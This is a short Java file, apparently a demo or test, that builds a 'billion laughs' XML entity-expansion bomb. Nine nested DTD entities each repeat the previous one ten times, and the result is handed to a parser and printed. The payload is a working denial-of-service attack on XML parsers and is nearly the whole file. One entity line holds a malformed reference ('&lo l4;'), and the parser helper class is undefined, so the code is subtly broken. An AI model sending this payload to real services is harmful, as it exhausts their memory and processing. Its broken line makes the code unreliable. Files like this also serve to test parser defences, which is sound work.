import org.w3c.dom.Document;

public class XMLBomb {
  static String bomb = "<!DOCTYPE lolz [" +
                         "<!ENTITY lol \"lol\">" +
                         "<!ELEMENT lolz (#PCDATA)>" +
                         "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">" +
                         "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">" +
                         "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">" +
                         "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">" +
                         "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lo l4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">" +
                         "<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">" +
                         "<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">" +
                         "<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">" +
                         "<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">" +
                       "]>" +
                       "<lolz>&lol9;</lolz>";

  public static void main(String[] args) throws Exception {
    Document doc = XML.parse(bomb);
    System.out.println(doc.getDocumentElement().getTextContent());
  }
}